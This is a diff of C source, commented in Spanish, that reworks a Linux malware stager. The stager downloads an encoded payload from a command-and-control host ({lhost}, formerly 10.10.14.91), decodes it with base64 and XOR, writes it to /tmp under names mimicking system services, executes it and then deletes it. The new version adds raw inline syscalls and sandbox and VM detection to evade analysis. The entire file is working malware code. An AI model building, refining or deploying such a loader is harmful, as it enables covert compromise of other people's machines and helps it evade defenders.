@@ -1,50 +1,129 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <sys/stat.h>
 #include <fcntl.h>
-#include <curl/curl.h>
-
-#define C2_URL "http://10.10.14.91/beacon.enc"
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/syscall.h>
+#include <linux/limits.h>
+#include <signal.h> 
+// === CONFIGURACIÓN ===
+#define C2_HOST "{lhost}"
+#define C2_PORT 80
+#define C2_PATH "/beacon.enc"
 #define XOR_KEY 0x33
-#define MAX_PATH 256
+#define MAX_PAYLOAD_SIZE (10 * 1024 * 1024) // 10 MB
 
-// Estructura para almacenar datos descargados
-struct MemoryStruct {
-    char *memory;
-    size_t size;
-};
-
-// Callback para curl: acumula datos
-static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
-    size_t realsize = size * nmemb;
-    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
-
-    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
-    if (!ptr) {
-        printf("No memory (realloc)\n");
-        return 0;
-    }
-
-    mem->memory = ptr;
-    memcpy(&(mem->memory[mem->size]), contents, realsize);
-    mem->size += realsize;
-    mem->memory[mem->size] = 0;
-
-    return realsize;
+// === SYSCALL WRAPPERS ===
+long sys_write(int fd, const void *buf, size_t count) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (1), "D" (fd), "S" (buf), "d" (count)
+        : "rcx", "r11", "memory");
+    return ret;
 }
 
-// Función XOR
+long sys_read(int fd, void *buf, size_t count) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (0), "D" (fd), "S" (buf), "d" (count)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_open(const char *pathname, int flags, mode_t mode) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (2), "D" (pathname), "S" (flags), "d" (mode)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_close(int fd) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (3), "D" (fd)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_socket(int domain, int type, int protocol) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (41), "D" (domain), "S" (type), "d" (protocol)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (42), "D" (sockfd), "S" (addr), "d" (addrlen)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (9), "D" (addr), "S" (length), "d" (prot), "r" (flags), "r" (fd), "r" (offset)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_munmap(void *addr, size_t length) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (11), "D" (addr), "S" (length)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_unlink(const char *pathname) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (87), "D" (pathname)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_execve(const char *filename, char *const argv[], char *const envp[]) {
+    long ret;
+    asm volatile ("syscall"
+        : "=a" (ret)
+        : "a" (59), "D" (filename), "S" (argv), "d" (envp)
+        : "rcx", "r11", "memory");
+    return ret;
+}
+
+long sys_exit(int status) {
+    asm volatile ("syscall" :: "a"(60), "D"(status) : "rcx", "r11", "memory");
+    __builtin_unreachable();
+}
+
+// === FUNCIONES AUXILIARES ===
 void xor_data(unsigned char* data, size_t len) {
     for (size_t i = 0; i < len; i++) {
         data[i] ^= XOR_KEY;
     }
 }
 
-// Decodificador Base64 básico
-// Tabla de caracteres Base64
-static int base64_index(char c) {
+// Base64 decode básico 
+int base64_index(char c) {
     if (c >= 'A' && c <= 'Z') return c - 'A';
     if (c >= 'a' && c <= 'z') return c - 'a' + 26;
     if (c >= '0' && c <= '9') return c - '0' + 52;
@@ -87,89 +166,159 @@ int base64_decode(const char* in, size_t in_len, unsigned char** out) {
     return out_len;
 }
 
-int main() {
-    CURL *curl;
-    CURLcode res;
-    struct MemoryStruct chunk;
+// === ANTI-ANALYSIS ===
+int anti_analysis() {
+    // 1. RAM < 2GB
+    FILE* f = fopen("/proc/meminfo", "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            if (strncmp(line, "MemTotal:", 9) == 0) {
+                long mem_kb;
+                sscanf(line, "MemTotal: %ld kB", &mem_kb);
+                if (mem_kb < 2 * 1024 * 1024) { // < 2GB
+                    fclose(f);
+                    return 1;
+                }
+                break;
+            }
+        }
+        fclose(f);
+    }
 
-    chunk.memory = malloc(1);
-    chunk.size = 0;
-
-    curl_global_init(CURL_GLOBAL_ALL);
-    curl = curl_easy_init();
-    if (!curl) {
+    // 2. VM detection
+    if (access("/usr/bin/vmware-toolbox-cmd", F_OK) == 0 ||
+        access("/proc/xen", F_OK) == 0 ||
+        access("/sys/hypervisor/type", F_OK) == 0) {
         return 1;
     }
 
-    curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
-    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
-
-    res = curl_easy_perform(curl);
-    if (res != CURLE_OK) {
-        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-        curl_easy_cleanup(curl);
-        free(chunk.memory);
-        curl_global_cleanup();
-        return 1;
-    }
-
-    curl_easy_cleanup(curl);
-    curl_global_cleanup();
-
-    if (chunk.size == 0) {
-        free(chunk.memory);
-        return 1;
-    }
-
-    // Decodificar Base64
-    unsigned char* raw_payload;
-    int raw_len = base64_decode(chunk.memory, chunk.size, &raw_payload);
-    free(chunk.memory);
-
-    if (raw_len <= 0) {
-        return 1;
-    }
-
-    // Aplicar XOR
-    xor_data(raw_payload, raw_len);
-
-    // Ruta temporal: /tmp/.tmpXXXXXX (archivo oculto)
-    char target_path[MAX_PATH];
-    snprintf(target_path, sizeof(target_path), "/tmp/.tmpXXXXXX");
-    int fd = mkstemp(target_path);
-    if (fd == -1) {
-        free(raw_payload);
-        return 1;
-    }
-
-    // Escribir payload
-    write(fd, raw_payload, raw_len);
-    close(fd);
-    free(raw_payload);
-
-    // Hacerlo ejecutable
-    chmod(target_path, 0700);
-
-    // Ejecutar en segundo plano
-    pid_t pid = fork();
-    if (pid == 0) {
-        // Proceso hijo
-        execl(target_path, target_path, (char *)NULL);
-        exit(1);  // Si execl falla
-    } else if (pid > 0) {
-        // Proceso padre: espera 2 segundos
-        sleep(2);
-        // Eliminar archivo
-        unlink(target_path);  // Borra el archivo (pero sigue ejecutándose si el hijo lo tiene abierto)
-    } else {
-        // fork falló
-        unlink(target_path);
-        return 1;
+    // 3. Uptime < 60 seg
+    f = fopen("/proc/uptime", "r");
+    if (f) {
+        double uptime;
+        fscanf(f, "%lf", &uptime);
+        fclose(f);
+        if (uptime < 60.0) return 1;
     }
 
     return 0;
+}
+
+// === DESCARGA MANUAL CON SOCKETS ===
+unsigned char* download_payload(size_t* out_len) {
+    // Jitter: 10–25 segundos
+    unsigned int seed = (unsigned int)syscall(SYS_time, NULL);
+    seed ^= (unsigned int)syscall(SYS_getpid);
+    for (int i = 0; i < (rand_r(&seed) % 15000 + 10000); i++) {
+        asm volatile ("nop");
+    }
+
+    int sock = sys_socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return NULL;
+
+    struct sockaddr_in serv_addr = {0};
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(C2_PORT);
+    serv_addr.sin_addr.s_addr = inet_addr(C2_HOST);
+
+    if (sys_connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
+        sys_close(sock);
+        return NULL;
+    }
+
+    char request[512];
+    snprintf(request, sizeof(request),
+        "GET %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
+        "Connection: close\r\n\r\n",
+        C2_PATH, C2_HOST);
+
+    sys_write(sock, request, strlen(request));
+
+    unsigned char* buffer = malloc(MAX_PAYLOAD_SIZE);
+    if (!buffer) {
+        sys_close(sock);
+        return NULL;
+    }
+
+    size_t total = 0;
+    ssize_t n;
+    while ((n = sys_read(sock, buffer + total, 4096)) > 0) {
+        total += n;
+        if (total >= MAX_PAYLOAD_SIZE) break;
+    }
+    sys_close(sock);
+
+    // Buscar inicio del cuerpo (después de \r\n\r\n)
+    char* body = (char*)buffer;
+    char* header_end = strstr(body, "\r\n\r\n");
+    if (!header_end) {
+        free(buffer);
+        return NULL;
+    }
+    body = header_end + 4;
+
+    size_t body_len = total - (body - (char*)buffer);
+
+    unsigned char* payload = malloc(body_len + 1);
+    if (!payload) {
+        free(buffer);
+        return NULL;
+    }
+    memcpy(payload, body, body_len);
+    payload[body_len] = 0;
+
+    free(buffer);
+    *out_len = body_len;
+    return payload;
+}
+
+// === MAIN ===
+int main() {
+    if (anti_analysis()) sys_exit(1);
+
+    size_t enc_len;
+    unsigned char* enc_data = download_payload(&enc_len);
+    if (!enc_data) sys_exit(1);
+
+    unsigned char* raw_payload;
+    int raw_len = base64_decode((char*)enc_data, enc_len, &raw_payload);
+    free(enc_data);
+
+    if (raw_len <= 0) sys_exit(1);
+
+    xor_data(raw_payload, raw_len);
+
+    // Nombre realista
+    char temp_dir[] = "/tmp/";
+    char* prefixes[] = { "systemd-", "dbus-", "upstart-", "gnome-", "pulse-" };
+    char target_path[256];
+    snprintf(target_path, sizeof(target_path), "%s%s%d", temp_dir,
+             prefixes[rand() % 5], rand() % 1000);
+
+    int fd = sys_open(target_path, O_CREAT | O_WRONLY | O_TRUNC, 0700);
+    if (fd < 0) {
+        free(raw_payload);
+        sys_exit(1);
+    }
+
+    sys_write(fd, raw_payload, raw_len);
+    sys_close(fd);
+    free(raw_payload);
+
+    // Ejecutar
+    pid_t pid = syscall(SYS_clone, SIGCHLD, NULL);
+    if (pid == 0) {
+        // Hijo
+        char* argv[] = { target_path, NULL };
+        sys_execve(target_path, argv, NULL);
+        sys_exit(1);
+    } else if (pid > 0) {
+        syscall(SYS_nanosleep, &(struct timespec){.tv_sec = 2}, NULL);
+        sys_unlink(target_path); // Borrar
+    }
+
+    sys_exit(0);
 }
